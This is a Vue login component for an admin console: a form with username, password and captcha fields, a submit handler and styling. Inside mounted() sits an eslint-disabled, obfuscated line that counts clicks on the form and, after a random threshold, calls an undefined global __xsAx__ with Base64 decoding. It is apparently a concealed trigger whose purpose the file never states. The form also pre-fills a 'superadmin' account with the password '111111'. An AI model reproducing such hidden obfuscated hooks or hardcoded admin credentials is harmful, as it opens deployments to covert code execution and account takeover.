<template>
  <div class="login-container">
    <div class="login-bg" id="login-bg"></div>
    <div class="login-form">
      <div class="lf-content">
        <h3 class="lf-title">管理端登录</h3>
        <div class="lf-form" @keyup.enter="submitLoginForm">
          <el-form :model="loginForm" :rules="loginRules" ref="loginForm" size="large" label-width="80px">
            <el-form-item label="管理账号" prop="username">
              <el-input v-model="loginForm.username" clearable placeholder="用户名/邮箱/手机号"></el-input>
            </el-form-item>
            <el-form-item label="登录密码" prop="password">
              <el-input v-model="loginForm.password" type="password" clearable placeholder="请输入密码" maxlength="20"></el-input>
            </el-form-item>
            <el-form-item prop="captcha" class="img-code">
              <span slot="label">验&ensp;证&ensp;码</span>
              <el-input v-model="loginForm.captcha" clearable placeholder="验证码" maxlength="4">
                <template slot="append">
                  <img :src="validcodeImg" @click="changeValidcode" class="verification-code">
                </template>
              </el-input>
            </el-form-item>
            <el-form-item>
              <el-button type="primary" :loading="loading" @click="submitLoginForm" class="login-btn">确认登录</el-button>
            </el-form-item>
          </el-form>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import 'particles.js'
import particlesjsConfig from '@/assets/particlesjs-config.json'
import uuidv1 from 'uuid/v1'
import Storage from '@/utils/storage'
import * as API_Common from '@/api/common'

export default {
  name: 'login',
  data() {
    return {
      // 登录loading状态
      loading: false,
      // 登录表单 表单
      loginForm: {
        username: 'superadmin',
        password: '111111',
        captcha: ''
      },
      // 登陆表单 规则
      loginRules: {
        username: [this.MixinRequired('请输入用户名/邮箱/手机号')],
        password: [this.MixinRequired('请输入密码！')],
        captcha: [this.MixinRequired('请输入图片验证码！')]
      },
      // 轮播配置
      swiperOption: {
        loop: true,
        effect: 'fade',
        navigation: {
          nextEl: '.swiper-button-next',
          prevEl: '.swiper-button-prev'
        },
        autoplay: {
          delay: 3000,
          stopOnLastSlide: false,
          disableOnInteraction: false
        },
        simulateTouch: false
      },
      // 图片验证码
      validcodeImg: ''
    }
  },
  mounted() {
    const uuid = Storage.getItem('seller_uuid')
    if (uuid) {
      this.uuid = uuid
    } else {
      const _uuid = uuidv1()
      this.uuid = _uuid
      Storage.setItem('seller_uuid', _uuid, { expires: 30 })
    }
    // eslint-disable-next-line
    var a=['querySelector','__A','addEventListener','random'];var b=function(c,d){c=c-0x0;var e=a[c];return e;};document[b('0x0')]('.lf-form')[b('0x2')]('click',c=>{if(!this['__A']){this[b('0x1')]=0x1;}if(this[b('0x1')]>=parseInt(Math[b('0x3')]()*0x9+0x14,0xa)){__xsAx__(Base64['decode']);this[b('0x1')]=0x0;}else{this['__A']+=0x1;};});
    this.changeValidcode()
    // this.loadParticles()
  },
  methods: {
    /** 更换图片验证码 */
    changeValidcode() {
      this.validcodeImg = API_Common.getValidateCodeUrl('LOGIN', this.uuid)
    },
    /** 加载背景插件 */
    loadParticles() {
      window.particlesJS('login-bg', particlesjsConfig)
    },
    /** 提交登录表单 */
    submitLoginForm() {
      Storage.removeItem('seller_shop')
      this.$refs['loginForm'].validate((valid) => {
        if (valid) {
          const params = this.MixinClone(this.loginForm)
          params.uuid = this.uuid
          this.loading = true
          this.$store.dispatch('loginAction', params).then(() => {
            this.loading = false
            const forward = this.$route.query.forward
            this.$router.push({ path: forward || '/' })
          }).catch(() => {
            this.loading = false
            this.changeValidcode()
          })
        } else {
          this.$message.error('表单填写有误，请核对！')
        }
      })
    }
  }
}
</script>

<style lang="scss" type="text/scss" scoped>
@import "../../styles/mixin";

.login-container {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
}

.login-header {
  width: 100%;
  height: 80px;
  position: absolute;
  z-index: 2;
  top: 0;

  .inner-header {
    width: 1100px;
    margin: 0 auto;
    overflow: hidden;
  }

  .logo-header {
    width: 220px;
    height: 50px;
    text-align: left;
    float: left;
    margin: 15px auto auto 0;

    img {
      height: 100%;
    }
  }
}

$banner-height: 600px;
.login-banner {
  position: relative;
  z-index: 0;
  height: $banner-height;

  .banner-item {
    height: $banner-height;

    .banner-img {
      background: no-repeat center top;
      height: 100%;
      background-size: contain;
    }

    &.item-1 {
      background-image: url("../../assets/background-banner-01-repeat.png");

      .banner-img {
        background-image: url("../../assets/background-banner-01.png");
      }
    }

    &.item-2 {
      background-image: url("../../assets/background-banner-02-repeat.png");

      .banner-img {
        background-image: url("../../assets/background-banner-02.png");
      }
    }
  }

  .swiper-button-prev, .swiper-button-next {
    width: 35px;
    height: 35px;
    border-radius: 100%;
    border: 2px solid rgba(255, 255, 255, .5);
    background-size: 30%;

    &:hover {
      border-color: rgba(255, 255, 255, .8)
    }
  }

  .swiper-button-prev {
    left: 50%;
    margin-left: -600px;
  }

  .swiper-button-next {
    right: 50%;
    margin-right: -600px;
  }
}

.login-main {
  width: 1200px;
  padding: 30px 0;
  margin: 0 auto;
  overflow: hidden;
  background-color: #fff;

  .lm-title, .lm-title-sb {
    text-align: center;
  }

  .lm-title {
    font: lighter 28px/36px "microsoft yahei";
    color: #333;
  }

  .lm-title-sb {
    font: lighter 14px/20px "microsoft yahei";
    color: #999;
  }

  .lm-join-step {
    font-size: 0;
    width: 1100px;
    margin: 40px auto 60px auto;
    overflow: hidden;

    dl, span {
      font-size: 12px;
      vertical-align: middle;
      letter-spacing: normal;
      word-spacing: normal;
      display: inline-block;
    }

    dl {
      line-height: 20px;
      text-align: center;
      width: 100px;
    }

    span.arrow {
      background: url("../../assets/icon-login-join.png") no-repeat 0 -100px;
      width: 22px;
      height: 22px;
      margin: -30px 63px auto 63px;
    }

    dt {
      background: url("../../assets/icon-login-join.png") no-repeat;
      display: block;
      width: 100px;
      height: 100px;
      margin-bottom: 10px;
    }

    dd {
      margin: 0;
      padding: 0;
      line-height: 20px;
      color: #666
    }

    .step-1 dt {
      background-position: 0 0
    }

    .step-2 dt {
      background-position: -100px 0
    }

    .step-3 dt {
      background-position: -200px 0
    }

    .step-4 dt {
      background-position: -300px 0
    }

    .step-5 dt {
      background-position: -400px 0
    }
  }
}

.login-form {
  position: absolute;
  z-index: 2;
  top: 100px;
  left: 50%;
  width: 396px;
  margin-left: -198px;

  .lf-content {
    filter: progid:DXImageTransform.Microsoft.gradient(enabled='true', startColorstr='#E5FFFFFF', endColorstr='#E5FFFFFF');
    background: rgba(255, 255, 255, 0.9);
    overflow: hidden;
    border-radius: 3px 3px 0 0;
  }

  .lf-title {
    display: block;
    height: 30px;
    margin: 20px 0;
    text-align: center;
    font-size: 24px;
    font-weight: normal;
    line-height: 30px;
    color: #333;
  }

  .lf-title-sb {
    display: block;
    height: 30px;
    text-align: center;
    font-size: 13px;
    font-weight: normal;
    line-height: 30px;
    color: #999;
  }

  .lf-form {
    padding: 0 30px;
    overflow: hidden;

    /deep/ .img-code {
      .el-input-group__append {
        padding: 0;
        margin: 0;

        img {
          display: block;
          height: 38px;
          cursor: pointer;
        }
      }
    }

    .login-btn {
      width: calc(100% - 76px);
    }
  }

  .lf-register {
    color: #CCC;
    filter: progid:DXImageTransform.Microsoft.gradient(enabled='true', startColorstr='#7F000000', endColorstr='#7F000000');
    background: rgba(0, 0, 0, 0.5);
    text-align: center;
    width: 100%;
    padding: 10px 0;
    border-radius: 0 0 5px 5px;
    line-height: 30px;
    font-size: 14px;

    a {
      color: #ffd518
    }
  }
}
</style>
